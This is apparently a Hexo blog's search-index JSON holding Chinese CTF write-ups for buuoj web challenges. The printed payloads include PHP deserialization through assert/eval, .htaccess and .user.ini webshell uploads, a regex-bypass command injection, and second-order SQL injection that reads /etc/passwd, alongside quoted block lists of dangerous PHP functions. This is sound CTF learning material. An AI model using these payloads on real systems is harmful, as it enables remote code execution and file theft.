{"pages":[{"title":"categories","text":"","link":"/categories/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"friends","text":"","link":"/friends/index.html"},{"title":"about","text":"","link":"/about/index.html"}],"posts":[{"title":"test","text":"","link":"/2020/05/28/test/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","link":"/2020/05/28/hello-world/"},{"title":"BUUCTF[NPUCTF2020]web WP","text":"[TOC] BUUCTF[NPUCTF2020]上周做了做NPUCTF的题，今天在buuoj上面复现了一波，顺便写写write up ReadlezPHP这是一道简单的反序列化的题进入页面没什么发现，只有一个跳转到西工大官网的链接，然后查看源码，发现一个隐藏的a标签 然后进入页面，看到了源码 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp{ public $a; public $b; public function __construct(){ $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; } public function __destruct(){ $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); }}$c = new HelloPhp;if(isset($_GET['source'])){ highlight_file(__FILE__); die(0);}@$ppp = unserialize($_GET[&quot;data&quot;]); 这段代码的关键在于当执行反序列化函数的时候，调用__destruct函数执行echo $b($a)，我们便可以利用这个函数执行任意我们想执行的函数，从而达到getshell的目的。接下来便是写php脚本构造序列化了，期间试了很多函数比如system等等都被禁用了，但是我们还可以用assert这个函数。首先我们来了解一下断言（assert）这个函数，参考大佬的文章PHP assert 和 eval assert 判断一个表达式是否成立。返回true or false； 我们来看一个例子： 1234&lt;?php$a = &quot;123&quot;;echo assert(is_numeric($a));?&gt; 这段代码输出的结果是： 简言之就是assert()可以将整个字符串参数当作php参数执行，而类似的eval()函数是执行合法的php代码。接下来放出序列化的脚本 12345678910111213&lt;?phpclass HelloPhp{ public $a; public $b; }$c = new HelloPhp;$c-&gt;b = 'assert';$c-&gt;a = 'eval($_POST[a]);';echo urlencode(serialize($c)).&quot;&lt;br/&gt;&quot;;?&gt; 这里除了用assert()之外，还可以用call_user_func()函数 call_user_func — 把第一个参数作为回调函数调用 12345678&lt;?php function barber($type){ echo &quot;you wanted a $type haircut, no problem\\n&quot;;}call_user_func('barber','mushroom');?&gt;//返回内容如下：//you wanted a mushroom haircut, no problem 只要构造出call_user_func(phpinfo)就好了 payload: 1?data=O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A16%3A%22eval%28%24_POST%5Ba%5D%29%3B%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D 成功得出结果： flag就在phpinfo中 得到flag！ 未完待续···","link":"/2020/05/28/Kath4rs1s/"},{"title":"buuoj 刷题记录（一）","text":"[TOC] 刷题记录（一） [网鼎杯 2020 朱雀组]phpweb抓包 date是一个函数，后面的p应该是它的参数，猜测使用了call_user_func(函数名，参数)函数使用 func=readfile&amp;p=index.php 读取源码 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;, &quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;, &quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;, &quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;, &quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;, &quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;, &quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;, &quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;, &quot;file_put_contents&quot;);function gettime($func, $p) { $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) { return $result; } else { return &quot;&quot;; }}class Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}/*$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) { $func = strtolower($func); if (!in_array($func,$disable_fun)) { echo gettime($func, $p); }else { die(&quot;Hacker...&quot;); }} 禁用了很多函数，看到有__destruct()函数，尝试构造反序列化 12345678910111213141516&lt;?phpclass Test { var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() { if ($this-&gt;func != &quot;&quot;) { echo gettime($this-&gt;func, $this-&gt;p); } }}$a = new Test();//$a-&gt;p = 'find / -name flag*';$a-&gt;p = 'cat /tmp/flagoefiu4r93';$a-&gt;func = 'system';print_r(urlencode(serialize($a))); 寻找flag文件 读取flag [MRCTF2020]你传你ma呢利用BurpSuite修改MIME欺骗后端文件类型 修改 Content-Type: image/png 然后就可以传任意文件后缀 利用.htaccess来制作图片马 增加使用php解析的文件后缀(.jpg) 1AddType application/x-httpd-php .jpg 然后再写个一句话，连上蚁剑即可 [极客大挑战 2019]Upload绕过后缀名检验：php、php3、php5、php7、pht、phtml文件头加入 GIF89a修改 Content-Type: image/jpeg可解析为php的标签 12345&lt;?php phpinfo(); ?&gt;&lt;?= phpinfo(); ?&gt;&lt;script language=php&gt;phpinfo();&lt;/script&gt; //php7移除&lt;? phpinfo(); ?&gt; //需要php.ini中short_open_tag=On&lt;% phpinfo(); %&gt; //需要php.ini中asp_tags = On php7移除 php版本是5.5.9，用第三个上传之后连接蚁剑即可 [FBCTF2019]RCEService1234567891011121314151617181920212223&lt;?phpputenv('PATH=/home/rceservice/jail');if (isset($_REQUEST['cmd'])) { $json = $_REQUEST['cmd']; if (!is_string($json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } elseif (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\\x00-\\x1FA-Z0-9!#-\\/;-@\\[-`|~\\x7F]+).*$/', $json)) { echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; } else { echo 'Attempting to run command:&lt;br/&gt;'; $cmd = json_decode($json, true)['cmd']; if ($cmd !== NULL) { system($cmd); } else { echo 'Invalid input'; } echo '&lt;br/&gt;&lt;br/&gt;'; }}?&gt; 正则表达式修饰符s匹配多行，这里直接用%0A换行符绕过正则payload： 1{%0A&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0A} Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用 [SUCTF 2019]CheckIn 考点：文件上传 利用.user.ini构造php后门，.user.ini的使用前提是目录中必须有至少一个php文件，.user.ini有两个配置参数：auto_prepend_file和auto_append_file。auto_prepend_file指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中： 1auto_prepend_file=01.gif 01.gif是要包含的文件。所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。 参考链接https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html [GXYCTF2019]BabyUpload没什么好说的，apache服务器上传.htaccess文件 [BJDCTF 2nd]Schrödinger毫无意义的一道题，浪费了十几分钟的时间。 [MRCTF2020]PYWebsite查看源码有flag.php，访问然后修改X-Forwarded-For: 127.0.0.1可得flag [网鼎杯 2018]Comment 二次注入，git泄露 爆破得到账号密码，登陆然后是git泄露，先下载源码然后修复，得到如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445&lt;?phpinclude &quot;mysql.php&quot;;session_start();if($_SESSION['login'] != 'yes'){ header(&quot;Location: ./login.php&quot;); die();}if(isset($_GET['do'])){switch ($_GET['do']){case 'write': $category = addslashes($_POST['category']); $title = addslashes($_POST['title']); $content = addslashes($_POST['content']); $sql = &quot;insert into board set category = '$category', title = '$title', content = '$content'&quot;; $result = mysql_query($sql); header(&quot;Location: ./index.php&quot;); break;case 'comment': $bo_id = addslashes($_POST['bo_id']); $sql = &quot;select category from board where id='$bo_id'&quot;; $result = mysql_query($sql); $num = mysql_num_rows($result); if($num&gt;0){ $category = mysql_fetch_array($result)['category']; $content = addslashes($_POST['content']); $sql = &quot;insert into comment set category = '$category', content = '$content', bo_id = '$bo_id'&quot;; $result = mysql_query($sql); } header(&quot;Location: ./comment.php?id=$bo_id&quot;); break;default: header(&quot;Location: ./index.php&quot;);}}else{ header(&quot;Location: ./index.php&quot;);}?&gt; do=write的时候对传入的数据进行转移，但是之后数据库会自动清除反斜杠，然后do=commit的时候对取出的category没有进行处理就插入，导致了二次注入，所以前面那个addslashes根本起不到防护的作用第一次输入category和第二次输入content可以拼接，如下 1234insert into commentset category = '',content=user(),/*', content = '*/#', bo_id = '$bo_id'&quot;; 然后再放两个payload，读取flag: 12',content=(select load_file('/etc/passwd')),/*',content=(select hex(load_file('/var/www/html/flag_8946e1ff1ee3e40f.php'))),/* elementmaster这个没什么好说的，直接上脚本 12345678910111213141516import osimport requests as reqelements = ('H', 'He', 'Li', 'Be', 'B', 'C', 'N', 'O', 'F', 'Ne', 'Na', 'Mg', 'Al', 'Si', 'P', 'S', 'Cl', 'Ar', 'K', 'Ca', 'Sc', 'Ti', 'V', 'Cr', 'Mn', 'Fe', 'Co', 'Ni', 'Cu', 'Zn', 'Ga', 'Ge', 'As', 'Se', 'Br', 'Kr', 'Rb', 'Sr', 'Y', 'Zr', 'Nb', 'Mo', 'Te', 'Ru', 'Rh', 'Pd', 'Ag', 'Cd', 'In', 'Sn', 'Sb', 'Te', 'I', 'Xe', 'Cs', 'Ba', 'La', 'Ce', 'Pr', 'Nd', 'Pm', 'Sm', 'Eu', 'Gd', 'Tb', 'Dy', 'Ho', 'Er', 'Tm', 'Yb', 'Lu', 'Hf', 'Ta', 'W', 'Re', 'Os', 'Ir', 'Pt', 'Au', 'Hg', 'Tl', 'Pb', 'Bi', 'Po', 'At', 'Rn', 'Fr', 'Ra', 'Ac', 'Th', 'Pa', 'U', 'Np', 'Pu', 'Am', 'Cm', 'Bk', 'Cf', 'Es', 'Fm','Md', 'No', 'Lr', 'Rf', 'Db', 'Sg', 'Bh', 'Hs', 'Mt', 'Ds', 'Rg', 'Cn', 'Nh', 'Fl', 'Mc', 'Lv', 'Ts', 'Og', 'Uue')for symbol in elements: link = &quot;http://bb55496d-1807-46ab-96ae-138ad4583386.node3.buuoj.cn/&quot; + symbol + &quot;.php&quot; response = req.get(link) if response.status_code == 200: print(response.text, end='') else: continue","link":"/2020/07/13/buuoj_1/"}],"tags":[],"categories":[{"name":"ctf","slug":"ctf","link":"/categories/ctf/"}]}